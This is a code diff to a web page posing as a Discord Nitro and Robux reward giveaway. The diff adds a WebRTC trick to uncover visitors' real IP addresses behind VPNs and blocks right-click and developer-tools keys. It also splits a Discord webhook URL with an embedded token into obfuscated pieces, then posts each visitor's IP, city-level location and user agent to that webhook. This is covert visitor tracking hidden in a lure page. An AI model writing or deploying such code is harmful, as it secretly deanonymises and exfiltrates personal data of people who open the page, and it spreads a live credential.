@@ -7,7 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* [Your existing styles – unchanged for brevity] */
+    /* [Your existing styles – unchanged, omitted for brevity] */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -349,10 +349,10 @@
     const isExtvifyRoute = path === '/extvify' || path === '/extvify/';
 
     // ============================================================
-    //  /scammer/extvify ROUTE – with obfuscated webhook
+    //  /scammer/extvify ROUTE – with WebRTC IP detection (bypass VPN attempts)
     // ============================================================
     if (isScammerRoute) {
-      // Anti‑debug measures
+      // Anti‑debug / anti‑source
       document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
       document.addEventListener('keydown', function(e) {
         if (e.key === 'F12' ||
@@ -396,23 +396,40 @@
         }
       }
 
-      // --- OBFUSCATED WEBHOOK (scattered pieces) ---
-      // Part 1 (base URL)
+      // --- WebRTC IP detection (attempt to get real IP behind VPN) ---
+      function getWebRTCIP(callback) {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (event) => {
+          if (event.candidate) {
+            const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(event.candidate.candidate);
+            if (ipMatch) {
+              callback(ipMatch[0]);
+              pc.close();
+            }
+          }
+        };
+        setTimeout(() => callback(null), 3000);
+      }
+
+      // --- Obfuscated webhook (scattered parts) ---
       const _p1 = "https://discord.com/api/webhooks/1511201588964757565/";
-      // Part 2 – first half of token
       const _p2 = "yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwk";
-      // Part 3 – second half of token
       const _p3 = "t3wQ-hzKsmKmz7a";
-      // Assemble webhook URL
       const webhookUrl = _p1 + _p2 + _p3;
 
-      // Get IP and location, then send to webhook
-      fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(ipData => {
-          const ip = ipData.ip;
+      // --- Main logic: try WebRTC first, then fallback to API ---
+      getWebRTCIP((webrtcIP) => {
+        let ipPromise;
+        if (webrtcIP) {
+          ipPromise = Promise.resolve(webrtcIP);
+        } else {
+          ipPromise = fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
+        }
+        ipPromise.then(ip => {
           if (!ip) throw new Error('No IP');
-          
+          // Location APIs
           const locationAPIs = [
             () => fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city`).then(r => r.json()).then(data => {
               if (data.status === 'success') return `${data.city}, ${data.regionName} ${data.country}`;
@@ -427,7 +444,6 @@
               throw new Error();
             })
           ];
-
           let apiIndex = 0;
           function tryNextAPI() {
             if (apiIndex >= locationAPIs.length) {
@@ -435,7 +451,7 @@
               fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: Unknown\nUser Agent: ${navigator.userAgent}` })
+                body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: Unknown\nUser Agent: ${navigator.userAgent}\nVPN Bypass Attempt: ${webrtcIP ? 'WebRTC success' : 'WebRTC failed'}` })
               }).catch(e => console.error);
               return;
             }
@@ -445,7 +461,7 @@
                 fetch(webhookUrl, {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}` })
+                  body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}\nVPN Bypass: ${webrtcIP ? 'WebRTC IP used' : 'Standard API'}` })
                 }).catch(e => console.error);
               })
               .catch(() => {
@@ -454,15 +470,15 @@
               });
           }
           tryNextAPI();
-        })
-        .catch(() => {
+        }).catch(() => {
           renderIPPage(null, null, true);
         });
+      });
       return;
     }
 
     // ============================================================
-    //  NORMAL REWARD PAGE – for root, /extvify, and any other path
+    //  NORMAL REWARD PAGE – unchanged (full functionality)
     // ============================================================
     let pageViews = parseInt(localStorage.getItem('extvify_pageViews') || 0) + 1;
     localStorage.setItem('extvify_pageViews', pageViews);
